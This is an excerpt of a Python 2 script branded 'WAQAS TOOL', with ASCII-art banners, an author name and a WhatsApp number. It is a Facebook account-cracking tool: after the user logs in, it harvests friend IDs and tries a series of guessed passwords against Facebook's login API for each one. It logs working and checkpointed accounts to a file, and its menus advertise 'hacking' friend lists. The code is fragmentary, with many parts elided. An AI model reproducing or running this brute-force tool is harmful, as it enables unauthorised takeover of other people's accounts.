...
\033[1;95m ░▀░▀░ ▀░▀ ░▀█ ▀░▀ ▀▀░
\033[1;31m\033[1;31m╔══════════════════════════════════════════════════╗
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* Name  : \033[1;39mWAQAS    
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* frome: \033[1;39mpakistan   
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* WhatsApp  : \033[1;39m+923170424820  
\033[1;31m\033[1;31m╚══════════════════════════════════════════════════╝"""
...
os.system("clear")
print "\033[1;96m•◈•───────────────•◈•\033[1;92mWAQAS\033[1;96m•◈•───────────────•◈•"
print  """
\033[1;95m █░░░█ ▄▀▄ ▄▀█ ▄▀▄ ▄▀▀
\033[1;95m █░█░█ █▀█ █░█ █▀█ ░▀▄
\033[1;95m ░▀░▀░ ▀░▀ ░▀█ ▀░▀ ▀▀░
...
jalan("    \033[1;95m ░▐█░▐█░░▐█─░▐█░▐█▄█▒▐█▒▐▄░▐█▄▄▒▐█▀▄▄")
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("    \033[1;93m▇▇\033[1;93m           Welcomes to WAQAS TOOL")
jalan("    \033[1;92m▇▇\033[1;93m                        AUTHOR")
jalan("    \033[1;92m▇▇\033[1;93m                WAQAS pakistani")
jalan("    \033[1;92m▇▇\033[1;93m     WhatsApp  +923170424820")
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
...
def login():
	os.system('clear')
	print logo
	print "\033[1;93m1.\x1b[1;95m Login With Facebook  "
        time.sleep(0.05)
        print "\033[1;93m2.\x1b[1;95m Login With Token"
        time.sleep(0.05)
        print "\033[1;93m3.\x1b[1;95m Get Access Token App Fb"
        time.sleep(0.05)
...
def login1():
	...
	try:
		...
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;92mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;92mPassword      \x1b[1;93m: \x1b[1;92m')
		tik()
		try:
...
def menu():
	...
	try:
		...
		keluar()
	os.system("clear") #Dev:Amir Baber
        time.sleep(0.05)
	print logo
	print "\033[1;92m•◈•───────────────•◈•\033[1;92mWAQAS\033[1;96m•◈•───────────────•◈•"
...
def super():
	...
	print logo
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mWAQAS\033[1;96m•◈•───────────────•◈•"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m] \033[1;95mApni ID Ki Friend List Hack"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m] \033[1;95mApny Dost Ki Friend List Hack"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m] \033[1;95mList Bana K Hack Kro"
...
def pilih_super():
	...
	if peak =="":
		...
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mWAQAS\033[1;96m•◈•───────────────•◈•"
		idt = raw_input("\033[1;96m[+] \033[1;35mEnter Friend ID Code \033[1;91m: \033[1;97m")
		try:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;98m[ok] \033[1;94m ' + user  + ' \x1b[1;36;40m|\033[1;94m ' + pass1 + ' 🐞 ' + b['name']
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;98m[ok] \033[1;94m ' + user  + ' \x1b[1;36;94m|\033[1;94m ' + pass2 + ' 🐞 ' + b['name']
							cek = open("out/CP.txt", "a")
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;98m[ok] \033[1;94m ' + user  + ' \x1b[1;36;94m|\033[1;94m ' + pass3 + ' 🐞 ' + b['name']
									cek = open("out/CP.txt", "a")
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;98m[ok] \033[1;94m ' + user  + ' \x1b[1;36;94m|\033[1;94m ' + pass5 + ' 🐞 ' + b['name']
													cek = open("out/CP.txt", "a")
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;98m[ok] \033[1;94m ' + user  + ' \x1b[1;36;94m|\033[1;94m ' + pass6 + ' 🐞 ' + b['name']
															cek = open("out/CP.txt", "a")
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;98m[Login Now] \033[1;94m ' + user  + ' \x1b[1;36;40m|\033[1;94m ' + pass7 + ' 🐞 ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;98m[ok] \033[1;94m ' + user  + ' \x1b[1;36;94m|\033[1;94m ' + pass7 + ' 🐞 ' + b['name']
																	cek = open("out/CP.txt", "a")
															...
															if 'access_token' in q:
																        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
																print '\033[1;98m[Login Now] \033[1;94m ' + user  + ' \x1b[1;36;40m|\033[1;94m ' + pass8 + ' 🐞 ' + b['name']
																oks.append(user+pass8)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;98m[ok] \033[1;94m ' + user  + ' \x1b[1;36;94m|\033[1;94m ' + pass8 + ' 🐞 ' + b['name']
																	cek = open("out/CP.txt", "a")
